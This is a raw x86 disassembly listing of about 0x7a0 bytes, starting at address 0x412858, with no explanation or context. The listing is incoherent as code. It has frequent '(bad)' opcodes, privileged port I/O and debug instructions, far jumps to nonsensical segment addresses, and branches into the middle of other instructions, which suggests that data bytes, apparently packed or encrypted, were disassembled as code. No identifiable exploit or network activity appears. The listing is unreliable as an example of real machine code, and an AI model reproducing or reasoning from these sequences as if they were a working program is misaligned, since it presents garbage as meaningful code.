  412858:	and    BYTE PTR [esi+0x5da8d7d5],cl
  41285e:	add    eax,0xa991e40
  412863:	push   esi
  412864:	arpl   WORD PTR [esi],bx
  412866:	jmp    0xc687:0x95877c8b
  41286d:	sbb    bl,ah
  41286f:	je     0x412824
  412871:	mov    WORD PTR [eax-0x7ee99be7],gs
  412877:	test   DWORD PTR [edx],ebp
  412879:	push   ebp
  41287a:	icebp  
  41287b:	sub    eax,0xd10a71f2
  412880:	js     0x412860
  412882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412883:	jecxz  0x4128e9
  412885:	push   esp
  412886:	fs or  ch,al
  412889:	nop
  41288a:	or     al,BYTE PTR [esi-0x4d]
  41288d:	push   edx
  41288e:	cmc    
  41288f:	out    dx,eax
  412890:	je     0x412911
  412892:	fwait
  412893:	jp     0x4128fd
  412895:	mul    DWORD PTR [ecx]
  412897:	adc    al,0x77
  412899:	xor    al,0xb5
  41289b:	jmp    0x99c0:0x27e3b5d3
  4128a2:	dec    esp
  4128a3:	daa    
  4128a4:	mov    eax,ds:0x6858bf68
  4128a9:	mov    cl,0x21
  4128ab:	outs   dx,BYTE PTR ds:[esi]
  4128ac:	iret   
  4128ad:	push   ebp
  4128ae:	popa   
  4128af:	mov    ?,WORD PTR [eax]
  4128b1:	int3   
  4128b2:	jmp    0x412864
  4128b4:	mov    DWORD PTR ds:0x684efb14,esp
  4128ba:	pushf  
  4128bb:	push   ecx
  4128bc:	fstp   TBYTE PTR [edx]
  4128be:	cmp    al,0x0
  4128c0:	out    dx,eax
  4128c1:	and    ecx,edx
  4128c3:	inc    eax
  4128c4:	loop   0x41286c
  4128c6:	call   0x9152:0x32266883
  4128cd:	ins    DWORD PTR es:[edi],dx
  4128ce:	ret    0x30f3
  4128d1:	xor    DWORD PTR [eax-0x624e79fe],eax
  4128d7:	sub    eax,0x4671f232
  4128dc:	mov    ah,0xc3
  4128de:	or     eax,0x832634e9
  4128e3:	mov    ds:0x8bd8e895,eax
  4128e8:	(bad)  
  4128e9:	xchg   esp,eax
  4128ea:	cs pushf 
  4128ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128ed:	lahf   
  4128ee:	cmp    edx,DWORD PTR [edi]
  4128f0:	into   
  4128f1:	push   cs
  4128f2:	stos   BYTE PTR es:[edi],al
  4128f3:	ins    BYTE PTR es:[edi],dx
  4128f4:	imul   esp,DWORD PTR [edi+0x44c890ed],0xffffffb1
  4128fb:	adc    BYTE PTR [ebp+0x7efb84a6],al
  412901:	dec    esi
  412902:	adc    eax,0x206633b4
  412907:	jae    0x412959
  412909:	retf   0xd3bd
  41290c:	jne    0x4128bb
  41290e:	into   
  41290f:	mov    edi,0x86702e0a
  412914:	out    0x1b,al
  412916:	dec    esp
  412917:	xchg   edx,eax
  412918:	iret   
  412919:	adc    eax,0x4f911b6f
  41291e:	inc    edx
  41291f:	adc    al,0x8a
  412921:	aaa    
  412922:	fwait
  412923:	mov    ds:0x4250b2ef,al
  412928:	imul   esi,ebx,0x5b
  41292b:	sbb    BYTE PTR [eax],ch
  41292d:	jmp    0x4128b8
  41292f:	sbb    dl,BYTE PTR [ebx]
  412931:	pop    ss
  412932:	adc    bl,BYTE PTR [ecx-0x662a6ef]
  412938:	xchg   edx,eax
  412939:	outs   dx,DWORD PTR ds:[esi]
  41293a:	ror    DWORD PTR ds:0x8f840b81,1
  412940:	sbb    al,0x21
  412942:	and    esp,ebx
  412944:	repz popf 
  412946:	scas   eax,DWORD PTR es:[edi]
  412947:	int3   
  412948:	sbb    DWORD PTR [edi+eax*2+0x7099e5f3],ebx
  41294f:	hlt    
  412950:	cwde   
  412951:	add    BYTE PTR [ecx],al
  412953:	or     dh,BYTE PTR [esi]
  412955:	cmp    al,0x2b
  412957:	jns    0x412945
  412959:	jp     0x4129c3
  41295b:	mov    ebx,0x81c7b81f
  412960:	jmp    0xe5f8fdfd
  412965:	out    0x82,al
  412967:	adc    eax,0xd1c12da9
  41296c:	sti    
  41296d:	les    eax,FWORD PTR [edx+0x13]
  412970:	adc    BYTE PTR [esi+0x9168140],al
  412976:	sti    
  412977:	pop    ebp
  412978:	je     0x4129f8
  41297a:	mov    ds:0x33e617aa,al
  41297f:	mov    esi,0xb4a68aa5
  412984:	inc    ebp
  412985:	jo     0x412974
  412987:	dec    ebx
  412988:	dec    ebp
  412989:	addr16 cli 
  41298b:	adc    BYTE PTR [ebp-0x22fe868f],cl
  412991:	outs   dx,BYTE PTR ds:[esi]
  412992:	push   edx
  412993:	mov    al,ds:0x536ae6c1
  412998:	fsubr  QWORD PTR [ebx+edx*1]
  41299b:	outs   dx,BYTE PTR ds:[esi]
  41299c:	inc    edx
  41299d:	pop    eax
  41299e:	cmp    BYTE PTR [esi-0x58],ah
  4129a1:	jp     0x4129eb
  4129a3:	(bad)  
  4129a4:	int    0xa6
  4129a6:	jnp    0x4129b8
  4129a8:	rcr    DWORD PTR [edi+0x1bc5d55a],1
  4129ae:	cmp    BYTE PTR [ecx-0x357b6a02],ch
  4129b4:	(bad)  
  4129b5:	pop    eax
  4129b6:	add    eax,DWORD PTR [esi-0x1]
  4129b9:	fld    st(6)
  4129bb:	test   BYTE PTR [ecx-0x66],0xfa
  4129bf:	ins    DWORD PTR es:[edi],dx
  4129c0:	add    DWORD PTR [eax+0x27a0ce10],ecx
  4129c6:	push   esp
  4129c7:	dec    ecx
  4129c8:	retf   
  4129c9:	and    eax,0x610fcda2
  4129ce:	test   DWORD PTR [eax],0x77fac916
  4129d4:	adc    esi,0x1fddc62f
  4129da:	arpl   WORD PTR [ebx+0x2afef80],dx
  4129e0:	xchg   ebx,eax
  4129e1:	adc    al,0x19
  4129e3:	pop    edx
  4129e4:	into   
  4129e5:	clc    
  4129e6:	jbe    0x412a55
  4129e8:	jmp    FWORD PTR [eax+0x9]
  4129eb:	ja     0x4129bf
  4129ed:	pop    esi
  4129ee:	sbb    ecx,DWORD PTR [ecx-0x78]
  4129f1:	retf   
  4129f2:	mov    edi,0x53060e56
  4129f7:	adc    al,0x27
  4129f9:	das    
  4129fa:	mov    bl,0x38
  4129fc:	test   DWORD PTR [eax],ebp
  4129fe:	adc    eax,0xee3051c0
  412a03:	sub    dl,BYTE PTR [edi-0x1e85ac85]
  412a09:	aad    0x1d
  412a0b:	nop
  412a0c:	outs   dx,BYTE PTR ds:[esi]
  412a0d:	or     BYTE PTR [ebx+0x3915323b],ah
  412a13:	call   0x445b8c22
  412a18:	lds    ecx,FWORD PTR [ebx+0x79175614]
  412a1e:	hlt    
  412a1f:	push   0x68
  412a21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a22:	dec    eax
  412a23:	push   esi
  412a24:	dec    esp
  412a25:	mov    al,0x6e
  412a27:	mov    DWORD PTR [edi+ebp*8+0x49],eax
  412a2b:	cld    
  412a2c:	test   eax,0xb1ba5603
  412a31:	adc    al,0x19
  412a33:	and    cl,ch
  412a35:	pop    es
  412a36:	add    ebx,DWORD PTR [ebx-0x67]
  412a39:	in     eax,dx
  412a3a:	inc    eax
  412a3b:	xchg   edi,eax
  412a3c:	pop    edx
  412a3d:	push   esi
  412a3e:	xchg   ebx,eax
  412a3f:	sbb    DWORD PTR [ebx+ebx*4],esi
  412a42:	pop    esp
  412a43:	lds    eax,FWORD PTR [eax+0x2e]
  412a46:	cmp    al,0x4f
  412a48:	rcl    bl,0xb2
  412a4b:	mov    ds:0xd368e674,eax
  412a50:	adc    al,0x35
  412a52:	fstp   TBYTE PTR [eax+0x34f0c2ce]
  412a58:	add    al,0x2c
  412a5a:	jl     0x412a71
  412a5c:	xor    BYTE PTR [esi+edx*4-0x6c1f5ed8],ah
  412a63:	int    0xdd
  412a65:	in     eax,0x3
  412a67:	test   DWORD PTR [ebx+ebp*4],esi
  412a6a:	sub    BYTE PTR [esi-0x2b0aee5b],ah
  412a70:	popa   
  412a71:	cmp    DWORD PTR [esi],0xe3ca37bd
  412a77:	dec    esi
  412a78:	enter  0xb7ac,0xcc
  412a7c:	sub    eax,0xa1fac759
  412a81:	in     al,dx
  412a82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a83:	call   0x71ca6405
  412a88:	mov    ebp,0x83e5740f
  412a8d:	pop    ds
  412a8e:	push   ds
  412a8f:	cmp    ah,BYTE PTR [esi-0x36bda2a3]
  412a95:	sqrtps xmm1,XMMWORD PTR [edi+0x2424e3ea]
  412a9c:	jae    0x412a8b
  412a9e:	es scas eax,DWORD PTR es:[edi]
  412aa0:	arpl   bp,sp
  412aa2:	inc    ebp
  412aa3:	loop   0x412ae7
  412aa5:	jmp    0x17fa7b7c
  412aaa:	sbb    al,0xae
  412aac:	jns    0x412a35
  412aae:	mov    edx,0x6c46fca0
  412ab3:	inc    edi
  412ab4:	loop   0x412b0a
  412ab6:	xor    cl,cl
  412ab8:	add    bl,ah
  412aba:	cmp    ch,bl
  412abc:	sub    al,0x54
  412abe:	sahf   
  412abf:	aam    0xfa
  412ac1:	mov    ds:0xa0ac750a,al
  412ac6:	cmc    
  412ac7:	(bad)  [esi]
  412ac9:	ror    edx,0x2b
  412acc:	popa   
  412acd:	dec    esi
  412ace:	mov    edi,eax
  412ad0:	das    
  412ad1:	mov    ss,WORD PTR [ebx]
  412ad3:	dec    esp
  412ad4:	sub    bh,bl
  412ad6:	jno    0x412a8a
  412ad8:	adc    ecx,edi
  412ada:	test   eax,0x8e894984
  412adf:	pushf  
  412ae0:	test   ebx,0x8acd17fd
  412ae6:	sar    BYTE PTR [ecx-0x4662a713],0xff
  412aed:	sbb    al,0x4c
  412aef:	lds    esp,FWORD PTR [edi+ebx*4]
  412af2:	mov    ah,0x39
  412af4:	jl     0x412ad9
  412af6:	call   0xfa4e:0x48b06c4b
  412afd:	push   ebx
  412afe:	mov    dh,0xc6
  412b00:	sub    ebx,DWORD PTR [esi+0x53]
  412b03:	js     0x412b80
  412b05:	loop   0x412aba
  412b07:	xor    al,0xa6
  412b09:	loopne 0x412b6e
  412b0b:	nop
  412b0c:	test   eax,0x27257553
  412b11:	outs   dx,DWORD PTR ds:[esi]
  412b12:	and    ah,BYTE PTR [eax+0x674a1111]
  412b18:	nop
  412b19:	jb     0x412b30
  412b1b:	lds    ecx,FWORD PTR [edi]
  412b1d:	icebp  
  412b1e:	les    ebx,FWORD PTR [edi]
  412b20:	outs   dx,BYTE PTR ds:[esi]
  412b21:	iret   
  412b22:	addr16 pop ebx
  412b24:	daa    
  412b25:	dec    ecx
  412b26:	fsubr  DWORD PTR [eax]
  412b28:	iret   
  412b29:	pop    edx
  412b2a:	mov    ds:0xda6db213,al
  412b2f:	pop    edx
  412b30:	ss pushf 
  412b32:	pop    esp
  412b33:	or     DWORD PTR [ecx+eiz*1],ebx
  412b36:	outs   dx,DWORD PTR ds:[esi]
  412b37:	iret   
  412b38:	icebp  
  412b39:	add    al,0xa1
  412b3b:	mov    eax,0x9a643967
  412b40:	int    0x50
  412b42:	test   eax,0xaad58780
  412b47:	cwde   
  412b48:	or     eax,0xbc4800a8
  412b4d:	pop    esp
  412b4e:	xor    esi,eax
  412b50:	xchg   ebx,eax
  412b51:	(bad)  [ecx+0x69]
  412b54:	pop    DWORD PTR [eax-0x6f]
  412b57:	add    DWORD PTR [ecx+0x5b],esp
  412b5a:	icebp  
  412b5b:	pop    esi
  412b5c:	(bad)  
  412b5d:	cwde   
  412b5e:	cmc    
  412b5f:	in     al,dx
  412b60:	pusha  
  412b61:	sbb    al,0x4a
  412b63:	pop    esi
  412b64:	retf   
  412b65:	jb     0x412b3a
  412b67:	adc    al,0x62
  412b69:	cmp    eax,0x4c0a10a4
  412b6e:	push   bp
  412b70:	xchg   esi,eax
  412b71:	dec    ebp
  412b72:	in     al,0xdf
  412b74:	adc    eax,0x27f4ad24
  412b79:	retf   0x8042
  412b7c:	add    ch,BYTE PTR [edi+0x3cd414e7]
  412b82:	jb     0x412b84
  412b84:	les    edx,FWORD PTR [ebx-0x204e6467]
  412b8a:	jns    0x412b19
  412b8c:	mov    eax,0x426b18da
  412b91:	adc    DWORD PTR [eax+0xe],eax
  412b94:	ins    DWORD PTR es:[edi],dx
  412b95:	sbb    DWORD PTR [edx-0x7a2bee5a],ebp
  412b9b:	jne    0x412bec
  412b9d:	adc    BYTE PTR [eax],al
  412b9f:	inc    ecx
  412ba0:	jno    0x412bb6
  412ba2:	and    DWORD PTR ds:0x6f6862e4,esi
  412ba8:	cdq    
  412ba9:	in     eax,0xb9
  412bab:	jbe    0x412b5f
  412bad:	(bad)  
  412bae:	sub    ebp,esp
  412bb0:	mov    cl,0x63
  412bb2:	shr    edi,0x76
  412bb5:	mov    ebx,0xef348316
  412bba:	(bad)  [esp+eax*8+0x6d]
  412bbe:	sub    al,BYTE PTR [edx-0x5f]
  412bc1:	daa    
  412bc2:	push   0xa448fd15
  412bc7:	les    esi,FWORD PTR [esi]
  412bc9:	lods   al,BYTE PTR ds:[esi]
  412bca:	mov    ebp,0x1809dbc5
  412bcf:	movlps xmm2,QWORD PTR [edx+0xd]
  412bd3:	pop    ebp
  412bd4:	cli    
  412bd5:	mov    WORD PTR ds:0xb6dbd712,es
  412bdb:	ins    BYTE PTR es:[edi],dx
  412bdc:	in     al,dx
  412bdd:	cmp    ebp,DWORD PTR [ecx-0x34]
  412be0:	std    
  412be1:	dec    eax
  412be2:	add    DWORD PTR [esi-0x298634d1],ebx
  412be8:	shl    ebp,1
  412bea:	das    
  412beb:	(bad)  [edx-0x54]
  412bee:	inc    esi
  412bef:	fiadd  DWORD PTR [ecx]
  412bf1:	mov    ds:0x1aac0557,eax
  412bf6:	popa   
  412bf7:	jae    0x412bf7
  412bf9:	lods   al,BYTE PTR ds:[esi]
  412bfa:	daa    
  412bfb:	mov    ebp,0xdce4d96c
  412c00:	jmp    0xa9b5:0xd9189e05
  412c07:	bound  eax,QWORD PTR [ebx-0x51865ec1]
  412c0d:	mov    al,0x82
  412c0f:	push   es
  412c10:	or     cl,ch
  412c12:	mov    edx,0x6e587cd2
  412c17:	or     al,0x5f
  412c19:	inc    ebp
  412c1a:	dec    ebp
  412c1b:	mov    ah,bl
  412c1d:	or     ch,BYTE PTR [esi+0x6e854a2d]
  412c23:	call   0x2e6bdce6
  412c28:	loop   0x412c16
  412c2a:	sar    BYTE PTR [edx-0x4620beba],1
  412c30:	jecxz  0x412c90
  412c32:	fxtract 
  412c34:	js     0x412c1a
  412c36:	xor    al,BYTE PTR [ebp-0x5efea028]
  412c3c:	fiadd  DWORD PTR [edx]
  412c3e:	xor    eax,0xc38f39a6
  412c43:	push   eax
  412c44:	popf   
  412c45:	pop    esp
  412c46:	cmp    DWORD PTR [edi-0x306aef24],ebp
  412c4c:	rcl    BYTE PTR [edx],1
  412c4e:	add    dl,ah
  412c50:	loopne 0x412ccc
  412c52:	mov    al,0xf4
  412c54:	sbb    ebp,DWORD PTR [ecx]
  412c56:	ins    BYTE PTR es:[edi],dx
  412c57:	or     DWORD PTR [ecx+edx*1],edi
  412c5a:	jl     0x412c08
  412c5c:	inc    edx
  412c5d:	sub    eax,0xf5382337
  412c62:	inc    BYTE PTR [ebx+0x63]
  412c65:	popa   
  412c66:	or     eax,0x65307fe4
  412c6b:	stc    
  412c6c:	sbb    ebx,ebx
  412c6e:	mov    esp,ebx
  412c70:	daa    
  412c71:	xor    bl,cl
  412c73:	pop    eax
  412c74:	pop    ss
  412c75:	popf   
  412c76:	in     al,0xd2
  412c78:	mov    bl,0xf5
  412c7a:	mov    ebp,0x43ee5657
  412c7f:	sub    DWORD PTR [ecx],edx
  412c81:	mov    esp,0x12d98a8c
  412c86:	adc    BYTE PTR [esi+0xa],dl
  412c89:	mov    dh,0x8
  412c8b:	xchg   esi,eax
  412c8c:	test   DWORD PTR [ebp+0x58],esp
  412c8f:	(bad)
  412c93:	dec    esi
  412c94:	mov    esi,0xa6d99e59
  412c99:	add    al,0x77
  412c9b:	ss std 
  412c9d:	into   
  412c9e:	aad    0x98
  412ca0:	in     al,0xdf
  412ca2:	test   eax,0xae2d7f73
  412ca7:	and    al,0xf5
  412ca9:	(bad)  
  412caa:	lods   eax,DWORD PTR ds:[esi]
  412cab:	mov    es,WORD PTR [edx-0x68]
  412cae:	mov    eax,DWORD PTR [edx-0x75]
  412cb1:	stc    
  412cb2:	xor    al,0x46
  412cb4:	pop    es
  412cb5:	push   DWORD PTR [ecx]
  412cb7:	sub    BYTE PTR [edi-0x5e],dh
  412cba:	jbe    0x412c5b
  412cbc:	std    
  412cbd:	inc    esp
  412cbe:	rol    BYTE PTR [ebp+0x7a3faf8d],0xd7
  412cc5:	(bad)  [ecx]
  412cc7:	push   edx
  412cc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cc9:	add    dh,dh
  412ccb:	je     0x412cfc
  412ccd:	jnp    0x412d3b
  412ccf:	test   esp,edi
  412cd1:	xchg   edi,eax
  412cd2:	popa   
  412cd3:	mov    ah,0x7c
  412cd5:	repz pop es
  412cd7:	(bad)  
  412cd8:	pop    esi
  412cd9:	cs add al,0x6b
  412cdc:	adc    BYTE PTR [ecx],bh
  412cde:	call   0x6b4fe750
  412ce3:	xchg   esi,eax
  412ce4:	hlt    
  412ce5:	in     eax,0xb4
  412ce7:	adc    eax,0x6c5097d7
  412cec:	lea    ebx,[edx]
  412cee:	fwait
  412cef:	dec    esi
  412cf0:	sub    DWORD PTR [edi],ecx
  412cf2:	fiadd  DWORD PTR [ebp-0x55]
  412cf5:	dec    BYTE PTR [esi+ecx*4-0x4]
  412cf9:	(bad)  
  412cfa:	rcl    BYTE PTR [eax+0x5d2311a],cl
  412d00:	adc    BYTE PTR [ebp+0x41b65a58],ah
  412d06:	fild   WORD PTR [ecx+edx*8-0x1d96be82]
  412d0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d0e:	cmp    eax,0x178ad1
  412d13:	cdq    
  412d14:	icebp  
  412d15:	outs   dx,BYTE PTR ds:[esi]
  412d16:	repnz scas eax,DWORD PTR es:[edi]
  412d18:	mov    ah,0xb6
  412d1a:	ins    BYTE PTR es:[edi],dx
  412d1b:	xchg   ah,dl
  412d1d:	mov    esp,0x54b9d023
  412d22:	sbb    bl,ah
  412d24:	mov    al,ds:0x27f63f12
  412d29:	xchg   esi,eax
  412d2a:	cmp    BYTE PTR [esi+0x2912097a],dl
  412d30:	out    dx,al
  412d31:	int3   
  412d32:	cmc    
  412d33:	(bad)  
  412d34:	or     al,0x21
  412d36:	sbb    BYTE PTR [eax],dl
  412d38:	shr    dh,1
  412d3a:	outs   dx,BYTE PTR ds:[esi]
  412d3b:	add    BYTE PTR es:[edi],bh
  412d3e:	retf   
  412d3f:	inc    esi
  412d40:	es push eax
  412d42:	into   
  412d43:	scas   al,BYTE PTR es:[edi]
  412d44:	inc    eax
  412d45:	aaa    
  412d46:	das    
  412d47:	push   ss
  412d48:	xchg   cl,ch
  412d4a:	enter  0xe92,0x7d
  412d4e:	cmp    eax,0x96e31a14
  412d53:	and    al,0x86
  412d55:	jge    0x412d60
  412d57:	retf   
  412d58:	(bad)  
  412d59:	jle    0x412d86
  412d5b:	sub    eax,0xf645c025
  412d60:	jle    0x412d3e
  412d62:	mov    BYTE PTR [ebx],al
  412d64:	dec    eax
  412d65:	jmp    0x412d82
  412d67:	mov    WORD PTR [ecx],ds
  412d69:	pop    ecx
  412d6a:	add    ah,BYTE PTR [eax+eiz*4-0x33a15655]
  412d71:	or     BYTE PTR [esi+0x41],dl
  412d74:	loopne 0x412da0
  412d76:	int3   
  412d77:	stos   BYTE PTR es:[edi],al
  412d78:	pop    edi
  412d79:	iret   
  412d7a:	cmc    
  412d7b:	into   
  412d7c:	mov    dh,0xed
  412d7e:	mov    bl,0xa9
  412d80:	add    DWORD PTR [eax-0x2f],edi
  412d83:	iret   
  412d84:	dec    edi
  412d85:	lods   eax,DWORD PTR ds:[esi]
  412d86:	pop    esp
  412d87:	jg     0x412dd6
  412d89:	aam    0xf
  412d8b:	jge    0x412d5e
  412d8d:	sub    dl,al
  412d8f:	mov    ah,0xc7
  412d91:	mov    ds:0xc8a9d049,eax
  412d96:	jo     0x412ddf
  412d98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d99:	and    BYTE PTR fs:0xc55317d7,cl
  412da0:	lods   eax,DWORD PTR ds:[esi]
  412da1:	ror    edx,1
  412da3:	cmp    bl,bh
  412da5:	cmp    DWORD PTR [ebp+0x3d98fd74],0xffffff8c
  412dac:	out    dx,eax
  412dad:	mov    ah,0x4d
  412daf:	xchg   esp,eax
  412db0:	push   eax
  412db1:	sbb    DWORD PTR [edi+0x48],ebx
  412db4:	rcl    BYTE PTR [ecx-0x5a263c7a],1
  412dba:	in     al,dx
  412dbb:	aam    0x99
  412dbd:	out    dx,eax
  412dbe:	call   0x6de:0x5a4c190b
  412dc5:	retf   0x6a53
  412dc8:	pop    edi
  412dc9:	in     al,dx
  412dca:	xchg   ebp,eax
  412dcb:	sub    eax,0x952db5fb
  412dd0:	adc    eax,0xe2fe495
  412dd5:	nop
  412dd6:	pushf  
  412dd7:	test   BYTE PTR [ebp+0x15c87b9e],0x8e
  412dde:	lea    esp,[edx-0x5e]
  412de1:	aaa    
  412de2:	push   DWORD PTR [esi]
  412de4:	(bad)  
  412de5:	into   
  412de6:	adc    BYTE PTR [eax+0x71],cl
  412de9:	icebp  
  412dea:	mov    al,ds:0x2a0b9653
  412def:	xchg   BYTE PTR [ecx],dl
  412df1:	cmp    al,0xb0
  412df3:	adc    ecx,0x944080c4
  412df9:	xor    ebx,ecx
  412dfb:	jge    0x412e7a
  412dfd:	xchg   edx,eax
  412dfe:	sbb    al,0x9a
  412e00:	push   edi
  412e01:	mov    ds:0x764f43c4,eax
  412e06:	xchg   esi,eax
  412e07:	and    edi,DWORD PTR [esi]
  412e09:	push   eax
  412e0a:	pop    eax
  412e0b:	sub    esi,DWORD PTR [ebx]
  412e0d:	add    DWORD PTR [ebx-0x517fbe7b],ecx
  412e13:	cdq    
  412e14:	ja     0x412e87
  412e16:	dec    eax
  412e17:	or     BYTE PTR [edi+0x254da443],dl
  412e1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e1e:	stc    
  412e1f:	imul   esi,edi,0xd529b7cb
  412e25:	jp     0x412db4
  412e27:	daa    
  412e28:	adc    eax,0x7a4ec75c
  412e2d:	popf   
  412e2e:	jecxz  0x412e29
  412e30:	adc    edi,esi
  412e32:	out    dx,al
  412e33:	sub    bh,cl
  412e35:	out    dx,al
  412e36:	cdq    
  412e37:	les    esi,FWORD PTR [edi]
  412e39:	out    dx,eax
  412e3a:	fwait
  412e3b:	popf   
  412e3c:	das    
  412e3d:	pop    ds
  412e3e:	cs push ss
  412e40:	and    edi,DWORD PTR cs:[edx]
  412e43:	outs   dx,BYTE PTR ds:[esi]
  412e44:	cwde   
  412e45:	(bad)  
  412e47:	and    edi,esp
  412e49:	arpl   cx,bx
  412e4b:	int3   
  412e4c:	in     eax,0x9e
  412e4e:	aas    
  412e4f:	dec    ebx
  412e50:	or     eax,0xbcdee913
  412e55:	fild   QWORD PTR [edi-0x72]
  412e58:	icebp  
  412e59:	rcl    BYTE PTR [edx+0x55cbee58],1
  412e5f:	mov    esp,DWORD PTR [ebp+0x336795e2]
  412e65:	pop    ebp
  412e66:	pop    esi
  412e67:	ror    DWORD PTR [esi+0x32ac987d],cl
  412e6d:	sti    
  412e6e:	cmp    BYTE PTR [edi+0x573578d8],0x93
  412e75:	(bad)  
  412e76:	and    BYTE PTR [ecx+0x37c9f3d3],dl
  412e7c:	mov    eax,0x838ce0ea
  412e81:	push   eax
  412e82:	push   esp
  412e83:	arpl   WORD PTR [eax-0x59],ax
  412e86:	mov    esi,eax
  412e88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e89:	sub    al,0x94
  412e8b:	into   
  412e8c:	ins    DWORD PTR es:[edi],dx
  412e8d:	xchg   edx,eax
  412e8e:	push   ebx
  412e8f:	iret   
  412e90:	xchg   esp,eax
  412e91:	ret    0xda7a
  412e94:	push   ecx
  412e95:	div    ecx
  412e97:	add    DWORD PTR [eax-0x1662d3a],esi
  412e9d:	add    esp,esp
  412e9f:	mov    ds:0x55123bf3,eax
  412ea4:	out    dx,al
  412ea5:	and    DWORD PTR [ebp+0x3e],ebp
  412ea8:	int3   
  412ea9:	out    0x68,eax
  412eab:	add    al,0x54
  412ead:	cli    
  412eae:	xchg   esi,eax
  412eaf:	push   edx
  412eb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eb1:	add    eax,0xaf5c54a6
  412eb6:	sbb    eax,0x39567b9d
  412ebb:	dec    ecx
  412ebc:	scas   al,BYTE PTR es:[edi]
  412ebd:	retf   
  412ebe:	pop    ds
  412ebf:	int    0xf8
  412ec1:	(bad)  
  412ec2:	push   edi
  412ec3:	call   0x2b3f9223
  412ec8:	push   ebp
  412ec9:	in     eax,0x96
  412ecb:	push   eax
  412ecc:	adc    BYTE PTR [eax],bh
  412ece:	add    al,0xa0
  412ed0:	dec    esp
  412ed1:	aas    
  412ed2:	push   eax
  412ed3:	stos   BYTE PTR es:[edi],al
  412ed4:	and    esi,esp
  412ed6:	(bad)  
  412ed7:	in     al,0x37
  412ed9:	jmp    0xc6797d80
  412ede:	cwde   
  412edf:	fmul   st,st(5)
  412ee1:	xchg   esi,eax
  412ee2:	adc    eax,0x280d3cb
  412ee7:	(bad)  
  412ee8:	aas    
  412ee9:	xchg   edi,eax
  412eea:	in     al,dx
  412eeb:	pop    ebp
  412eec:	fidiv  DWORD PTR [eax-0x58]
  412eef:	add    DWORD PTR [ecx-0x79],0x232077bd
  412ef6:	cmp    DWORD PTR [edi+0x44],edi
  412ef9:	imul   ecx,DWORD PTR [edi-0x4a533cda],0x6b
  412f00:	fisttp QWORD PTR [edx-0x5f]
  412f03:	test   eax,0x226c903b
  412f08:	mov    cl,0x9c
  412f0a:	sti    
  412f0b:	pop    es
  412f0c:	dec    edi
  412f0d:	mov    eax,0x331954da
  412f12:	mov    bl,0x8d
  412f14:	es (bad) 
  412f16:	pop    edx
  412f17:	jno    0x412f97
  412f19:	call   0x9afbb736
  412f1e:	add    esp,0x42
  412f21:	sbb    DWORD PTR [ebx+0x78],esp
  412f24:	add    dh,BYTE PTR [ecx-0x3b]
  412f27:	mov    ah,BYTE PTR [edi]
  412f29:	sbb    eax,0xf3b16b9f
  412f2e:	fprem  
  412f30:	jp     0x412ecf
  412f32:	jg     0x412f36
  412f34:	test   eax,0x176cb2f4
  412f39:	add    eax,0xceab146d
  412f3e:	push   0xf6e2b619
  412f43:	adc    BYTE PTR [ecx+0x7d],cl
  412f46:	dec    esp
  412f47:	dec    ecx
  412f48:	jg     0x412eff
  412f4a:	xchg   BYTE PTR [esi],dl
  412f4c:	stos   BYTE PTR es:[edi],al
  412f4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f4e:	xchg   edx,eax
  412f4f:	cmp    al,BYTE PTR [ebx+0xc]
  412f52:	fstp   st(4)
  412f54:	xor    dh,BYTE PTR [esi-0x3f]
  412f57:	rcl    DWORD PTR [esi+0x4e],cl
  412f5a:	mov    eax,edi
  412f5c:	jecxz  0x412f65
  412f5e:	or     esi,DWORD PTR [edx]
  412f60:	xchg   esi,eax
  412f61:	mov    al,ds:0x9f8310ea
  412f66:	or     ecx,DWORD PTR [ebx]
  412f68:	test   al,0x9
  412f6a:	cwde   
  412f6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f6c:	sahf   
  412f6d:	lods   al,BYTE PTR ds:[esi]
  412f6e:	xchg   edx,eax
  412f6f:	and    esi,DWORD PTR [edx]
  412f71:	jo     0x412f23
  412f73:	pop    ebp
  412f74:	add    al,0x8a
  412f76:	test   al,0x11
  412f78:	fld    st(5)
  412f7a:	fiadd  DWORD PTR [eax-0x4011c47c]
  412f80:	mov    dl,0x21
  412f82:	sbb    esi,DWORD PTR [ebp+ecx*2-0x4]
  412f86:	sub    al,0xcd
  412f88:	jp     0x412f9f
  412f8a:	xchg   edi,eax
  412f8b:	inc    esi
  412f8c:	xchg   esp,eax
  412f8d:	call   0x8c49:0x5104cc32
  412f94:	sbb    ecx,0xffffff8f
  412f97:	add    bh,BYTE PTR [edx-0x54]
  412f9a:	inc    BYTE PTR [edx]
  412f9c:	jmp    0xb169:0x66967787
  412fa3:	jbe    0x412f3f
  412fa5:	daa    
  412fa6:	or     DWORD PTR [edx+edi*8+0x1684fee1],eax
  412fad:	and    BYTE PTR [eax-0x54ef3b67],bl
  412fb3:	and    eax,0x977b16b7
  412fb8:	jg     0x412fb0
  412fba:	cli    
  412fbb:	sub    al,0xe5
  412fbd:	ss pusha 
  412fbf:	leave  
  412fc0:	cli    
  412fc1:	or     BYTE PTR [ecx],ch
  412fc3:	sbb    cl,ah
  412fc5:	leave  
  412fc6:	cwde   
  412fc7:	fstp   TBYTE PTR fs:[esi+0x3c82b338]
  412fce:	leave  
  412fcf:	sub    al,0xde
  412fd1:	cld    
  412fd2:	cs pushf 
  412fd4:	sub    eax,0xec557c44
  412fd9:	pop    ebp
  412fda:	push   eax
  412fdb:	push   ecx
  412fdc:	mov    ds:0x16f535f1,al
  412fe1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fe2:	dec    ebp
  412fe3:	push   esi
  412fe4:	out    dx,eax
  412fe5:	lock add dl,BYTE PTR [edi]
  412fe8:	sub    eax,0x7cc4c40b
  412fed:	sbb    ebx,DWORD PTR [ecx-0x4a87e632]
  412ff3:	inc    ecx
  412ff4:	pop    eax
  412ff5:	ret    
  412ff6:	cwde   
  412ff7:	xor    eax,0xc973ee31
